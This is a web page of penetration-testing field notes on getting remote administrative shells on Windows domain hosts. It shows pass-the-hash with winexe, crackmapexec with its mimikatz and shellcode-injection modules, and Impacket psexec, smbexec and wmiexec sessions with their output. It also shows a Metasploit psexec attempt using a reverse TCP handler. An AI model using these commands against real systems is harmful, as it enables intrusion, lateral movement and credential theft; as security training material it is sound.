<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">


<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <script type="text/javascript">

      var _gaq = _gaq || [];
      _gaq.push(['_setAccount', 'UA-92365403-1']);
      _gaq.push(['_trackPageview']);

      (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
      })();
    </script>
    <title>Learning from the field : Administrative shells &#8212; tech.bitvijays.com</title>
    
    <link rel="stylesheet" href="_static/sphinxdoc.css" type="text/css" />
    <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
    
    <script type="text/javascript">
      var DOCUMENTATION_OPTIONS = {
        URL_ROOT:    './',
        VERSION:     '0.1',
        COLLAPSE_INDEX: false,
        FILE_SUFFIX: '.html',
        HAS_SOURCE:  true
      };
    </script>
    <script type="text/javascript" src="_static/jquery.js"></script>
    <script type="text/javascript" src="_static/underscore.js"></script>
    <script type="text/javascript" src="_static/doctools.js"></script>
    <link rel="search" title="Search" href="search.html" />
    <link rel="top" title="tech.bitvijays.com" href="index.html" />
    <link rel="next" title="Learning from the field : Securing your Debian" href="LFFSecuringDebian.html" />
    <link rel="prev" title="The Magic of Learning" href="index.html" /> 
  </head>
  <body role="document">
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>Navigation</h3>
      <ul>
        <li class="right" style="margin-right: 10px">
          <a href="LFFSecuringDebian.html" title="Learning from the field : Securing your Debian"
             accesskey="N">next</a></li>
        <li class="right" >
          <a href="index.html" title="The Magic of Learning"
             accesskey="P">previous</a> |</li>
        <li class="nav-item nav-item-0"><a href="index.html">tech.bitvijays.com</a> &#187;</li> 
      </ul>
    </div>
      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
        <div class="sphinxsidebarwrapper">
  <h3><a href="index.html">Table Of Contents</a></h3>
  <ul>
<li><a class="reference internal" href="#">Learning from the field : Administrative shells</a><ul>
<li><a class="reference internal" href="#remote-code-execution-methods">Remote Code Execution Methods:</a><ul>
<li><a class="reference internal" href="#winexe">Winexe</a></li>
<li><a class="reference internal" href="#crackmapexec">crackmapexec</a></li>
<li><a class="reference internal" href="#impacket-psexec-smbexe-wmiexec">Impacket psexec/ smbexe/ wmiexec</a></li>
<li><a class="reference internal" href="#metasploit-psexec">Metasploit psexec</a></li>
<li><a class="reference internal" href="#sysinternals-psexec">Sysinternals psexec</a></li>
<li><a class="reference internal" href="#smbclient">smbclient:</a></li>
<li><a class="reference internal" href="#rpclient">rpclient</a></li>
<li><a class="reference internal" href="#enum4linux">Enum4linux</a></li>
<li><a class="reference internal" href="#winrm">WinRM</a></li>
<li><a class="reference internal" href="#wmi">WMI</a></li>
<li><a class="reference internal" href="#dcom">DCOM</a></li>
<li><a class="reference internal" href="#xfreerdp-remote-desktop">xfreerdp/ Remote Desktop</a></li>
</ul>
</li>
<li><a class="reference internal" href="#add-remove-a-local-user">Add/ remove/ a local user</a></li>
<li><a class="reference internal" href="#add-remove-a-local-user-to-administrator-group">Add / remove a local user to administrator group</a></li>
<li><a class="reference internal" href="#get-sessions-of-remote-machines">Get sessions of remote machines</a></li>
<li><a class="reference internal" href="#view-users-in-domain-workgroup">View users in Domain / Workgroup</a></li>
<li><a class="reference internal" href="#view-machines-in-domain-workgroup">View machines in Domain/ Workgroup</a></li>
<li><a class="reference internal" href="#id3">View users in Domain / Workgroup</a></li>
<li><a class="reference internal" href="#hunting-for-a-particular-user">Hunting for a particular User?</a></li>
</ul>
</li>
</ul>

  <h4>Previous topic</h4>
  <p class="topless"><a href="index.html"
                        title="previous chapter">The Magic of Learning</a></p>
  <h4>Next topic</h4>
  <p class="topless"><a href="LFFSecuringDebian.html"
                        title="next chapter">Learning from the field : Securing your Debian</a></p>
  <h3>This Page</h3>
  <ul class="this-page-menu">
    <li><a href="_sources/LFFRemoteCodeExec.txt"
           rel="nofollow">Show Source</a></li>
    <li><a href="https://github.com/bitvijays/bitvijays.github.io-sphinx/blob/master/docs/LFFRemoteCodeExec.rst"
           rel="nofollow">Show on GitHub</a></li>
    <li><a href="https://github.com/bitvijays/bitvijays.github.io-sphinx/edit/master/docs/LFFRemoteCodeExec.rst"
           rel="nofollow">Edit on GitHub</a></li>
  </ul>
<div id="searchbox" style="display: none" role="search">
  <h3>Quick search</h3>
    <form class="search" action="search.html" method="get">
      <div><input type="text" name="q" /></div>
      <div><input type="submit" value="Go" /></div>
      <input type="hidden" name="check_keywords" value="yes" />
      <input type="hidden" name="area" value="default" />
    </form>
</div>
<script type="text/javascript">$('#searchbox').show(0);</script>
        </div>
      </div>

    <div class="document">
      <div class="documentwrapper">
        <div class="bodywrapper">
          <div class="body" role="main">
            
  <div class="section" id="learning-from-the-field-administrative-shells">
<h1>Learning from the field : Administrative shells<a class="headerlink" href="#learning-from-the-field-administrative-shells" title="Permalink to this headline">¶</a></h1>
<p>Once, we have access to a priviledged user of windows domain, there are multiple ways to get a execute remote commands on the remote machine.</p>
<div class="section" id="remote-code-execution-methods">
<h2>Remote Code Execution Methods:<a class="headerlink" href="#remote-code-execution-methods" title="Permalink to this headline">¶</a></h2>
<p>A lot of details for Remote Code execution has already been mentioned by Rop Nop in his three parts <a class="reference external" href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes/">Part 1: Using credentials to own windows boxes</a> , <a class="reference external" href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/">Part2: PSExec and Services</a> and <a class="reference external" href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/">Part: 3 Wmi and WinRM</a></p>
<div class="section" id="winexe">
<h3>Winexe<a class="headerlink" href="#winexe" title="Permalink to this headline">¶</a></h3>
<ul class="simple">
<li>Linux Binary pth-winexe</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span>winexe version 1.1
Usage: winexe [OPTION]... //HOST COMMAND
Options:
 -h, --help                                  Display help message
 -V, --version                               Display version number
 -U, --user=[DOMAIN/]USERNAME[%PASSWORD]     Set the network username
 -A, --authentication-file=FILE              Get the credentials from a file
 -N, --no-pass                               Do not ask for a password
 -k, --kerberos=STRING                       Use Kerberos, -k [yes|no]
 -d, --debuglevel=DEBUGLEVEL                 Set debug level
     --uninstall                             Uninstall winexe service after remote execution
     --reinstall                             Reinstall winexe service before remote execution
     --system                                Use SYSTEM account
     --profile                               Load user profile
     --convert                               Try to convert characters between local and remote code-pages
     --runas=[DOMAIN\]USERNAME%PASSWORD      Run as the given user (BEWARE: this password is sent in cleartext over the network!)
     --runas-file=FILE                       Run as user options defined in a file
     --interactive=0|1                       Desktop interaction: 0 - disallow, 1 - allow. If allow, also use the --system switch (Windows requirement). Vista does not support this option.
     --ostype=0|1|2                          OS type: 0 - 32-bit, 1 - 64-bit, 2 - winexe will decide. Determines which version (32-bit or 64-bit) of service will be installed.
</pre></div>
</div>
<p>Example with pth:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">pth</span><span class="o">-</span><span class="n">winexe</span> <span class="o">-</span><span class="n">U</span> <span class="o">./</span><span class="n">Administrator</span><span class="o">%</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">4</span><span class="n">b579a266f697c2f086d14ab9b208110</span> <span class="o">//</span><span class="mf">10.145</span><span class="o">.</span><span class="n">X</span><span class="o">.</span><span class="n">X</span> <span class="n">cmd</span><span class="o">.</span><span class="n">exe</span>
<span class="n">pth</span><span class="o">-</span><span class="n">winexe</span> <span class="o">-</span><span class="n">U</span> <span class="n">EXAMPLE</span><span class="o">/</span><span class="n">Administrator</span><span class="o">%</span><span class="n">example</span><span class="nd">@123</span> <span class="o">//</span><span class="mf">10.145</span><span class="o">.</span><span class="n">X</span><span class="o">.</span><span class="n">X</span> <span class="n">cmd</span><span class="o">.</span><span class="n">exe</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Windows Binary win-exe</li>
</ul>
<blockquote>
<div><p>win-exe can be downloaded from <a class="reference external" href="https://sourceforge.net/projects/winexe/">winexe</a></p>
<p>commands and usage is same as linux binary pth-winexe. However, it needed to be compiled from the source.</p>
</div></blockquote>
</div>
<div class="section" id="crackmapexec">
<h3>crackmapexec<a class="headerlink" href="#crackmapexec" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> is quite awesome tool when it comes to remote command execution. Read the <a class="reference external" href="https://github.com/byt3bl33d3r/CrackMapExec/wiki">wiki</a></p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">positional</span> <span class="n">arguments</span><span class="p">:</span>
<span class="n">target</span>                <span class="n">The</span> <span class="n">target</span> <span class="n">IP</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="nb">range</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="n">CIDR</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="n">hostname</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="n">FQDN</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="ow">or</span> <span class="n">file</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">containg</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">targets</span>

<span class="n">optional</span> <span class="n">arguments</span><span class="p">:</span>
  <span class="o">-</span><span class="n">h</span><span class="p">,</span> <span class="o">--</span><span class="n">help</span>            <span class="n">show</span> <span class="n">this</span> <span class="n">help</span> <span class="n">message</span> <span class="ow">and</span> <span class="n">exit</span>
  <span class="o">-</span><span class="n">v</span><span class="p">,</span> <span class="o">--</span><span class="n">version</span>         <span class="n">show</span> <span class="n">program</span><span class="s1">&#39;s version number and exit</span>
  <span class="o">-</span><span class="n">t</span> <span class="n">THREADS</span>            <span class="n">Set</span> <span class="n">how</span> <span class="n">many</span> <span class="n">concurrent</span> <span class="n">threads</span> <span class="n">to</span> <span class="n">use</span> <span class="p">(</span><span class="n">default</span><span class="p">:</span> <span class="mi">100</span><span class="p">)</span>
  <span class="o">-</span><span class="n">u</span> <span class="n">USERNAME</span> <span class="p">[</span><span class="n">USERNAME</span> <span class="o">...</span><span class="p">]</span>  <span class="n">Username</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="ow">or</span> <span class="n">file</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">containing</span> <span class="n">usernames</span>
  <span class="o">-</span><span class="n">d</span> <span class="n">DOMAIN</span>             <span class="n">Domain</span> <span class="n">name</span>
  <span class="o">--</span><span class="n">local</span><span class="o">-</span><span class="n">auth</span>          <span class="n">Authenticate</span> <span class="n">locally</span> <span class="n">to</span> <span class="n">each</span> <span class="n">target</span>
  <span class="o">-</span><span class="n">p</span> <span class="n">PASSWORD</span> <span class="p">[</span><span class="n">PASSWORD</span> <span class="o">...</span><span class="p">]</span>  <span class="n">Password</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="ow">or</span> <span class="n">file</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">containing</span> <span class="n">passwords</span>
  <span class="o">-</span><span class="n">H</span> <span class="n">HASH</span> <span class="p">[</span><span class="n">HASH</span> <span class="o">...</span><span class="p">]</span>    <span class="n">NTLM</span> <span class="nb">hash</span><span class="p">(</span><span class="n">es</span><span class="p">)</span> <span class="ow">or</span> <span class="n">file</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">containing</span> <span class="n">NTLM</span> <span class="n">hashes</span>
  <span class="o">-</span><span class="n">M</span> <span class="n">MODULE</span><span class="p">,</span> <span class="o">--</span><span class="n">module</span> <span class="n">MODULE</span> <span class="n">Payload</span> <span class="n">module</span> <span class="n">to</span> <span class="n">use</span>
  <span class="o">-</span><span class="n">MC</span> <span class="n">CHAIN_COMMAND</span><span class="p">,</span> <span class="o">--</span><span class="n">module</span><span class="o">-</span><span class="n">chain</span> <span class="n">CHAIN_COMMAND</span>  <span class="n">Payload</span> <span class="n">module</span> <span class="n">chain</span> <span class="n">command</span> <span class="n">string</span> <span class="n">to</span> <span class="n">run</span>
  <span class="o">-</span><span class="n">o</span> <span class="n">MODULE_OPTION</span> <span class="p">[</span><span class="n">MODULE_OPTION</span> <span class="o">...</span><span class="p">]</span> <span class="n">Payload</span> <span class="n">module</span> <span class="n">options</span>
  <span class="o">-</span><span class="n">L</span><span class="p">,</span> <span class="o">--</span><span class="nb">list</span><span class="o">-</span><span class="n">modules</span>    <span class="n">List</span> <span class="n">available</span> <span class="n">modules</span>
  <span class="o">--</span><span class="n">show</span><span class="o">-</span><span class="n">options</span>        <span class="n">Display</span> <span class="n">module</span> <span class="n">options</span>
  <span class="o">--</span><span class="n">verbose</span>             <span class="n">Enable</span> <span class="n">verbose</span> <span class="n">output</span>

<span class="n">Credential</span> <span class="n">Gathering</span><span class="p">:</span>
<span class="n">Options</span> <span class="k">for</span> <span class="n">gathering</span> <span class="n">credentials</span>

<span class="o">--</span><span class="n">sam</span>                 <span class="n">Dump</span> <span class="n">SAM</span> <span class="n">hashes</span> <span class="kn">from</span> <span class="nn">target</span> <span class="n">systems</span>
<span class="o">--</span><span class="n">lsa</span>                 <span class="n">Dump</span> <span class="n">LSA</span> <span class="n">secrets</span> <span class="kn">from</span> <span class="nn">target</span> <span class="n">systems</span>
<span class="o">--</span><span class="n">ntds</span> <span class="p">{</span><span class="n">vss</span><span class="p">,</span><span class="n">drsuapi</span><span class="p">}</span>  <span class="n">Dump</span> <span class="n">the</span> <span class="n">NTDS</span><span class="o">.</span><span class="n">dit</span> <span class="kn">from</span> <span class="nn">target</span> <span class="n">DCs</span> <span class="n">using</span> <span class="n">the</span> <span class="n">specifed</span> <span class="n">method</span>
                      <span class="p">(</span><span class="n">drsuapi</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">fastest</span><span class="p">)</span>
<span class="o">--</span><span class="n">ntds</span><span class="o">-</span><span class="n">history</span>        <span class="n">Dump</span> <span class="n">NTDS</span><span class="o">.</span><span class="n">dit</span> <span class="n">password</span> <span class="n">history</span>
<span class="o">--</span><span class="n">ntds</span><span class="o">-</span><span class="n">pwdLastSet</span>     <span class="n">Shows</span> <span class="n">the</span> <span class="n">pwdLastSet</span> <span class="n">attribute</span> <span class="k">for</span> <span class="n">each</span> <span class="n">NTDS</span><span class="o">.</span><span class="n">dit</span> <span class="n">account</span>
<span class="o">--</span><span class="n">wdigest</span> <span class="p">{</span><span class="n">enable</span><span class="p">,</span><span class="n">disable</span><span class="p">}</span>
                      <span class="n">Creates</span><span class="o">/</span><span class="n">Deletes</span> <span class="n">the</span> <span class="s1">&#39;UseLogonCredential&#39;</span> <span class="n">registry</span> <span class="n">key</span> <span class="n">enabling</span> <span class="n">WDigest</span> <span class="n">cred</span> <span class="n">dumping</span> <span class="n">on</span> <span class="n">Windows</span> <span class="o">&gt;=</span> <span class="mf">8.1</span>
<span class="n">Mapping</span><span class="o">/</span><span class="n">Enumeration</span><span class="p">:</span>
<span class="n">Options</span> <span class="k">for</span> <span class="n">Mapping</span><span class="o">/</span><span class="n">Enumerating</span>

<span class="o">--</span><span class="n">shares</span>              <span class="n">Enumerate</span> <span class="n">shares</span> <span class="ow">and</span> <span class="n">access</span>
<span class="o">--</span><span class="n">uac</span>                 <span class="n">Checks</span> <span class="n">UAC</span> <span class="n">status</span>
<span class="o">--</span><span class="n">sessions</span>            <span class="n">Enumerate</span> <span class="n">active</span> <span class="n">sessions</span>
<span class="o">--</span><span class="n">disks</span>               <span class="n">Enumerate</span> <span class="n">disks</span>
<span class="o">--</span><span class="n">users</span>               <span class="n">Enumerate</span> <span class="n">users</span>
<span class="o">--</span><span class="n">rid</span><span class="o">-</span><span class="n">brute</span> <span class="p">[</span><span class="n">MAX_RID</span><span class="p">]</span>
                      <span class="n">Enumerate</span> <span class="n">users</span> <span class="n">by</span> <span class="n">bruteforcing</span> <span class="n">RID</span><span class="s1">&#39;s (default: 4000)</span>
<span class="o">--</span><span class="k">pass</span><span class="o">-</span><span class="n">pol</span>            <span class="n">Dump</span> <span class="n">password</span> <span class="n">policy</span>
<span class="o">--</span><span class="n">lusers</span>              <span class="n">Enumerate</span> <span class="n">logged</span> <span class="n">on</span> <span class="n">users</span>
<span class="o">--</span><span class="n">wmi</span> <span class="n">QUERY</span>           <span class="n">Issues</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">WMI</span> <span class="n">query</span>
<span class="o">--</span><span class="n">wmi</span><span class="o">-</span><span class="n">namespace</span> <span class="n">NAMESPACE</span>
                      <span class="n">WMI</span> <span class="n">Namespace</span> <span class="p">(</span><span class="n">default</span><span class="p">:</span> <span class="o">//./</span><span class="n">root</span><span class="o">/</span><span class="n">cimv2</span><span class="p">)</span>

<span class="n">Command</span> <span class="n">Execution</span><span class="p">:</span>
<span class="n">Options</span> <span class="k">for</span> <span class="n">executing</span> <span class="n">commands</span>

<span class="o">--</span><span class="n">exec</span><span class="o">-</span><span class="n">method</span> <span class="p">{</span><span class="n">smbexec</span><span class="p">,</span><span class="n">wmiexec</span><span class="p">,</span><span class="n">atexec</span><span class="p">}</span>
                      <span class="n">Method</span> <span class="n">to</span> <span class="n">execute</span> <span class="n">the</span> <span class="n">command</span><span class="o">.</span> <span class="n">Ignored</span> <span class="k">if</span> <span class="ow">in</span> <span class="n">MSSQL</span> <span class="n">mode</span> <span class="p">(</span><span class="n">default</span><span class="p">:</span> <span class="n">wmiexec</span><span class="p">)</span>
<span class="o">--</span><span class="n">force</span><span class="o">-</span><span class="n">ps32</span>          <span class="n">Force</span> <span class="n">the</span> <span class="n">PowerShell</span> <span class="n">command</span> <span class="n">to</span> <span class="n">run</span> <span class="ow">in</span> <span class="n">a</span> <span class="mi">32</span><span class="o">-</span><span class="n">bit</span> <span class="n">process</span>
<span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">output</span>           <span class="n">Do</span> <span class="ow">not</span> <span class="n">retrieve</span> <span class="n">command</span> <span class="n">output</span>
<span class="o">-</span><span class="n">x</span> <span class="n">COMMAND</span>            <span class="n">Execute</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">command</span>
<span class="o">-</span><span class="n">X</span> <span class="n">PS_COMMAND</span>         <span class="n">Execute</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">PowerShell</span> <span class="n">command</span>
</pre></div>
</div>
<p>Modules in crackmapexec</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>crackmapexec -L
06-05-2016 14:08:03 [*] empire_exec          Uses Empire&#39;s RESTful API to generate a launcher for the specified listener and executes it
06-05-2016 14:08:03 [*] getgroups            Wrapper for PowerView&#39;s Get-NetGroup function
06-05-2016 14:08:03 [*] shellinject          Downloads the specified raw shellcode and injects it into memory using PowerSploit&#39;s Invoke-Shellcode.ps1 script
06-05-2016 14:08:03 [*] com_exec             Executes a command using a COM scriptlet to bypass whitelisting
06-05-2016 14:08:03 [*] tokens               Enumerates available tokens using Powersploit&#39;s Invoke-TokenManipulation
06-05-2016 14:08:03 [*] getgroupmembers      Wrapper for PowerView&#39;s Get-NetGroupMember function
06-05-2016 14:08:03 [*] mimikatz             Executes PowerSploit&#39;s Invoke-Mimikatz.ps1 script
06-05-2016 14:08:03 [*] peinject             Downloads the specified DLL/EXE and injects it into memory using PowerSploit&#39;s Invoke-ReflectivePEInjection.ps1 script
06-05-2016 14:08:03 [*] tokenrider           Allows for automatic token enumeration, impersonation and mass lateral spread using privileges instead of dumped credentials
06-05-2016 14:08:03 [*] metinject            Downloads the Meterpreter stager and injects it into memory using PowerSploit&#39;s Invoke-Shellcode.ps1 script
06-05-2016 14:08:03 [*] getcomputers         Wrapper for PowerView&#39;s Get-NetGroup function
06-05-2016 14:08:03 [*] KTHXBYE!
</pre></div>
</div>
<p>Using a module</p>
<p>Simply specify the module name with the -M flag:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">crackmapexec</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">10.11</span> <span class="o">-</span><span class="n">u</span> <span class="n">Administrator</span> <span class="o">-</span><span class="n">p</span> <span class="s1">&#39;P@ssw0rd&#39;</span> <span class="o">-</span><span class="n">M</span> <span class="n">mimikatz</span>
<span class="mi">06</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">2016</span> <span class="mi">14</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">59</span> <span class="n">CME</span>          <span class="mf">192.168</span><span class="o">.</span><span class="mf">10.11</span><span class="p">:</span><span class="mi">445</span> <span class="n">WIN7BOX</span>         <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">6.1</span> <span class="n">Build</span> <span class="mi">7601</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">WIN7BOX</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">LAB</span><span class="p">)</span>
</pre></div>
</div>
<p>Use the -M flag to specify the module and the &#8211;show-options argument to view the module&#8217;s supported options:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="c1">#~ crackmapexec -M mimikatz --show-options</span>
<span class="mi">06</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">2016</span> <span class="mi">14</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">33</span> <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">mimikatz</span> <span class="n">module</span> <span class="n">options</span><span class="p">:</span>
<span class="n">COMMAND</span> <span class="n">Mimikatz</span> <span class="n">command</span> <span class="n">to</span> <span class="n">execute</span> <span class="p">(</span><span class="n">default</span><span class="p">:</span> <span class="s1">&#39;sekurlsa::logonpasswords&#39;</span><span class="p">)</span>
</pre></div>
</div>
<p>Using module options
Module options are specified with the -o flag. All options are specified in the form of KEY=value (msfvenom style)</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">crackmapexec</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">10.11</span> <span class="o">-</span><span class="n">u</span> <span class="n">Administrator</span> <span class="o">-</span><span class="n">p</span> <span class="s1">&#39;P@ssw0rd&#39;</span> <span class="o">-</span><span class="n">M</span> <span class="n">mimikatz</span> <span class="o">-</span><span class="n">o</span> <span class="n">COMMAND</span><span class="o">=</span><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
</pre></div>
</div>
</div>
<div class="section" id="impacket-psexec-smbexe-wmiexec">
<h3>Impacket psexec/ smbexe/ wmiexec<a class="headerlink" href="#impacket-psexec-smbexe-wmiexec" title="Permalink to this headline">¶</a></h3>
<ul>
<li><p class="first">Impacket psexec</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>./psexec.py -debug Administrat0r:Passw0rd\!\!@10.0.5.180
Impacket v0.9.16-dev - Copyright 2002-2016 Core Security Technologies

[*] Trying protocol 445/SMB...

[*] Requesting shares on 10.0.5.180.....
[*] Found writable share ADMIN$
[*] Uploading file kBibbkKL.exe
[*] Opening SVCManager on 10.0.5.180.....
[*] Creating service cvZN on 10.0.5.180.....
[*] Starting service cvZN.....
[-] Pipe not ready, aborting
[*] Opening SVCManager on 10.0.5.180.....
[*] Stoping service cvZN.....
[*] Removing service cvZN.....
[*] Removing file kBibbkKL.exe.....
</pre></div>
</div>
</li>
<li><p class="first">Impacket smbexec</p>
</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span>./smbexec.py -debug Administrat0r:Passw0rd\!\!@10.0.5.180

Impacket v0.9.16-dev - Copyright 2002-2016 Core Security Technologies

[+] StringBinding ncacn_np:10.0.5.180[\pipe\svcctl]
[+] Executing %COMSPEC% /Q /c echo cd  ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat
[!] Launching semi-interactive shell - Careful what you execute

C:\Windows\system32&gt;ipconfig
[+] Executing %COMSPEC% /Q /c echo ipconfig ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat

Windows IP Configuration


Ethernet adapter Local Area Connection:

Connection-specific DNS Suffix  . :
Link-local IPv6 Address . . . . . : fe80::4546:b672:307:b488%10
IPv4 Address. . . . . . . . . . . : 10.0.5.180
Subnet Mask . . . . . . . . . . . : 255.255.254.0
Default Gateway . . . . . . . . . : 10.0.4.1

Tunnel adapter isatap.{EB92DEE7-521B-4E14-84C2-0E9B9E96563E}:

Media State . . . . . . . . . . . : Media disconnected
Connection-specific DNS Suffix  . :

Tunnel adapter Local Area Connection* 11:

Media State . . . . . . . . . . . : Media disconnected
Connection-specific DNS Suffix  . :

C:\Windows\system32&gt;
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Impacket wmiexec</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span>wmiexec.py -debug Administrat0r:Passw0rd\!\!@10.0.5.180

Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] SMBv2.1 dialect used
[+] Target system is 10.0.5.180 and isFDQN is False
[+] StringBinding: \\\\xxxxHBKS1739[\\PIPE\\atsvc]
[+] StringBinding: xxxxhbks1739[49155]
[+] StringBinding: 10.0.5.180[49155]
[+] StringBinding chosen: ncacn_ip_tcp:10.0.5.180[49155]
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\&gt;hostname
xxxxhbks1739

C:\&gt;whoami
xxxxhbks1739\administrat0r

C:\&gt;
</pre></div>
</div>
</div></blockquote>
</div>
<div class="section" id="metasploit-psexec">
<h3>Metasploit psexec<a class="headerlink" href="#metasploit-psexec" title="Permalink to this headline">¶</a></h3>
<p>Metasploit psexec have three methods to invoke, Let&#8217;s first try with target 2: Native upload</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">psexec</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">targets</span>

<span class="n">Exploit</span> <span class="n">targets</span><span class="p">:</span>

<span class="n">Id</span>  <span class="n">Name</span>
<span class="o">--</span>  <span class="o">----</span>
 <span class="mi">0</span>   <span class="n">Automatic</span>
 <span class="mi">1</span>   <span class="n">PowerShell</span>
 <span class="mi">2</span>   <span class="n">Native</span> <span class="n">upload</span>
 <span class="mi">3</span>   <span class="n">MOF</span> <span class="n">upload</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">psexec</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">target</span> <span class="mi">2</span>
<span class="n">target</span> <span class="o">=&gt;</span> <span class="mi">2</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Started</span> <span class="n">reverse</span> <span class="n">TCP</span> <span class="n">handler</span> <span class="n">on</span> <span class="mf">10.11</span><span class="o">.</span><span class="mf">43.116</span><span class="p">:</span><span class="mi">4444</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">5.180</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">the</span> <span class="n">server</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">5.180</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span> <span class="n">Authenticating</span> <span class="n">to</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">5.180</span><span class="p">:</span><span class="mi">445</span> <span class="k">as</span> <span class="n">user</span> <span class="s1">&#39;Administrat0r&#39;</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">5.180</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span> <span class="n">Uploading</span> <span class="n">payload</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">5.180</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span> <span class="n">Created</span> \<span class="n">hnFrgUVk</span><span class="o">.</span><span class="n">exe</span><span class="o">...</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">5.180</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span> <span class="n">Service</span> <span class="n">failed</span> <span class="n">to</span> <span class="n">start</span> <span class="o">-</span> <span class="n">ACCESS_DENIED</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">5.180</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span> <span class="n">Deleting</span> \<span class="n">hnFrgUVk</span><span class="o">.</span><span class="n">exe</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Exploit</span> <span class="n">completed</span><span class="p">,</span> <span class="n">but</span> <span class="n">no</span> <span class="n">session</span> <span class="n">was</span> <span class="n">created</span><span class="o">.</span>
</pre></div>
</div>
<p>We can see that the exploit was completed however, no session was created. Also the antivirus provided an alert.</p>
